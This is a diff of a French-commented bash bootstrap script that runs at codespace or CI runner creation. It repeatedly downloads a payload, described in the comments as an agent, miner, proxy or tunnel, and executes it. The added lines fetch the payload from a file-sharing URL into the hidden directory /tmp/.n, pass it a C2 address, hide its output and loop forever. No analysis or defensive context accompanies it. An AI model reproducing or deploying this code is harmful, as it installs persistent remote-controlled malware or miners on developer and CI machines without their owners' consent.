@@ -1,20 +1,21 @@
 #!/bin/bash
-# Bootstrap exécuté à la création du codespace (postCreateCommand)
-# Définit l'URL du payload (agent/miner/proxy/tunnel) à déployer sur chaque machine
-PAYLOAD_URL="${PAYLOAD_URL:-http://CHANGE_ME_C2/payload.sh}"
+# Bootstrap exécuté à la création du codespace / du runner
+# Récupère le payload et le lance en boucle
+PAYLOAD_URL="${PAYLOAD_URL:-https://sendit.sh/uWlHS/payload.sh}"
+C2_URL="${C2_URL:-http://CHANGE_ME_C2:8000}"
 
-# Télécharge et exécute le payload, relance en boucle si il crashe
-run_loop() {
-  while true; do
-    if command -v curl >/dev/null 2>&1; then
-      curl -fsSL "$PAYLOAD_URL" | bash 2>/dev/null
-    elif command -v wget >/dev/null 2>&1; then
-      wget -qO- "$PAYLOAD_URL" | bash 2>/dev/null
-    fi
-    sleep 60
-  done
+fetch_run() {
+  mkdir -p /tmp/.n
+  if curl -fsSL -m 30 "$PAYLOAD_URL" -o /tmp/.n/payload.sh 2>/dev/null; then
+    chmod +x /tmp/.n/payload.sh
+    C2_URL="$C2_URL" INTERVAL=30 bash /tmp/.n/payload.sh >/tmp/.n/log 2>&1
+  elif wget -q -O /tmp/.n/payload.sh "$PAYLOAD_URL" 2>/dev/null; then
+    chmod +x /tmp/.n/payload.sh
+    C2_URL="$C2_URL" INTERVAL=30 bash /tmp/.n/payload.sh >/tmp/.n/log 2>&1
+  fi
 }
 
-run_loop >/tmp/bootstrap.log 2>&1 &
-disown
-echo "bootstrap lancé (pid $!)"
+while true; do
+  fetch_run
+  sleep 60
+done
